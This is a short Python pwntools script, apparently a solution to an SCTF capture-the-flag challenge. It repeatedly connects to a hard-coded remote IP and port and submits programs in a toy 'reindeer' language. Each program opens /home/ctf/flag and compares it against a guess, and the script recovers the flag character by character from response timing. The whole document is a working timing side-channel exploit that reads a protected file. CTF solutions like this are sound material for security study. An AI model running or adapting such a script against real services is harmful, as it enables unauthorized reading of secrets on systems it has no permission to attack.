from pwn import * 
import string

# context.log_level = "debug"


dic = string.ascii_letters + string.digits + "_}"
print(dic)

flag = "SCTF{"
for i in range(21-5-1):
    for ch in dic:
        tmp = flag + ch
        slang_file = """
gift stdout is 1;
gift flag is "/home/ctf/flag";
gift buf is "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
gift size is 40;
gift none is 0;
gift fd is 0;
gift len is {};
gift guess is "{}";

reindeer Dancer delivering gift flag none none brings back gift fd;
reindeer Dasher delivering gift fd buf size;
reindeer Prancer delivering gift buf guess len brings back gift success;

this family wants gift success
    if the gift equal to 0:
        gift a is 1;
        Brave reindeer! Fear no difficulties!
ok, they should already have a gift;
EOF
        """.format(i+5+1, tmp)
        cn = remote("124.71.144.133", 2144)
        cn.recvuntil("===== Enter partial source for edge compute app (EOF to finish):")
        cn.sendline(slang_file.encode())
        start = time.time()
        cn.recvuntil("===== Test complete!")
        end = time.time()
        if (int(end - start) == 1):
            flag += ch
            print("[!] -get: ", flag)
            cn.close()
            break
        cn.close()
flag += "}"
print(flag)
